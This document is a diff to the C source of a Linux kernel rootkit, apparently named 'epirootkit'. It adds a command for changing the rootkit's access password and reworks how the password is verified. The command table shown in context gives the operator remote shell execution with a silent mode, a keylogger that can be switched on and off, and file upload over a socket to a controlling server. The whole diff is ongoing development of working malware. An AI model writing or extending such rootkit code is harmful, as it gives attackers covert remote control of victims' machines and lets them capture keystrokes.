@@ -1,31 +1,25 @@
 #include <linux/delay.h>
+#include <linux/fs.h>
 #include <linux/kernel.h>
 #include <linux/kmod.h>
 #include <linux/module.h>
-#include <linux/string.h>
-#include <linux/fs.h>
-#include <linux/uaccess.h>
 #include <linux/slab.h>
+#include <linux/string.h>
+#include <linux/uaccess.h>
 
 #include "crypto.h"
 #include "epirootkit.h"
 #include "menu.h"
+#include "passwd.h"
 
 #define UPLOAD_BLOCK_SIZE 4096
 
 extern struct socket *get_worker_socket(void);
 
-static u8 passwd_hash[SHA256_DIGEST_SIZE] = {
-    0x5e, 0x7e, 0x56, 0x44, 0xa5, 0xeb, 0xfd,
-    0x8e, 0x3f, 0xd4, 0x2a, 0x26, 0xf1, 0x5b,
-    0xe3, 0xe7, 0x16, 0x6a, 0xc0, 0x22, 0x53,
-    0xb5, 0xb4, 0x2a, 0x99, 0x43, 0x11, 0xed,
-    0x09, 0x54, 0x99, 0x9d
-};
-
 // Handler prototypes
 static int connect_handler(char *args);
 static int disconnect_handler(char *args);
+static int change_password_handler(char *args);
 static int exec_handler(char *args);
 static int klgon_handler(char *args);
 static int klgoff_handler(char *args);
@@ -45,6 +39,7 @@ static int upload_handler(char *args);
 static struct command rootkit_commands_array[] = {
     { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
     { "disconnect", 10, "disconnect user", 15, disconnect_handler },
+    { "passwd", 6, "change rootkit password. Usage: passwd NEW_PASSWORD", 60, change_password_handler },
     { "exec", 4, "execute a shell command. Usage: exec [-s for silent mode] [args*]", 65, exec_handler },
     { "klgon", 6, "activate keylogger", 20, klgon_handler },
     { "klgoff", 7, "deactivate keylogger", 21, klgoff_handler },
@@ -123,42 +118,51 @@ int rootkit_command(char *command, unsigned command_size) {
     return ret_code;
 }
 
+static int change_password_handler(char *args) {
+    if (!args || !*args) {
+        send_to_server("Usage: passwd NEW_PASSWORD\n");
+        return -EINVAL;
+    }
+
+    int ret = passwd_set(args);
+    if (ret < 0) {
+        ERR_MSG("change_password_handler: failed to set password: %d\n", ret);
+        send_to_server("Failed to set password\n");
+        return ret;
+    }
+
+    send_to_server("Password updated\n");
+    return SUCCESS;
+}
+
 static int connect_handler(char *args) {
     if (is_user_auth()) {
         send_to_server("You are already authentificated.\n");
         return true;
     }
 
-    DBG_MSG("password received: %s\n", args);
+    DBG_MSG("connect_handler: password received: %s\n", args);
+    DBG_MSG("connect_handler: verifying password…\n");
 
-    u8 hash[SHA256_DIGEST_SIZE] = { 0 };
-    hash_string(args, hash);
-    char hash_str[SHA256_DIGEST_SIZE * 2 + 1] = { 0 };
-    char passwd_hash_str[SHA256_DIGEST_SIZE * 2 + 1] = { 0 };
-
-    int i;
-    for (i = 0; i < SHA256_DIGEST_SIZE; i++) {
-        snprintf(hash_str + i * 2, 3, "%02x", hash[i]);
-        snprintf(passwd_hash_str + i * 2, 3, "%02x", passwd_hash[i]);
+    int pv = passwd_verify(args);
+    if (pv < 0) {
+        ERR_MSG("connect_handler: error verifying password: %d\n", pv);
+        return pv;
     }
 
-    DBG_MSG("computed hash: %s\n", hash_str);
-    DBG_MSG("expected hash: %s\n", passwd_hash_str);
-
-    bool hash_equals = are_hash_equals(passwd_hash, hash);
-    if (hash_equals) {
+    if (pv == 1) {
         set_user_auth(true);
-        DBG_MSG("connect_handler: user authentificated\n");
-        send_to_server("User authentificated\n");
+        DBG_MSG("connect_handler: user authenticated\n");
+        send_to_server("User authenticated.\n");
+        return true;
     }
     else {
         set_user_auth(false);
-        ERR_MSG("connect_handler: error while authentificating user\n");
+        ERR_MSG("connect_handler: invalid password\n");
+        send_to_server("Invalid password.\n");
         msleep(2 * TIMEOUT_BEFORE_RETRY);
-        send_to_server("Error while authentificating.\n");
+        return false;
     }
-
-    return hash_equals;
 }
 
 static int disconnect_handler(char *args) {
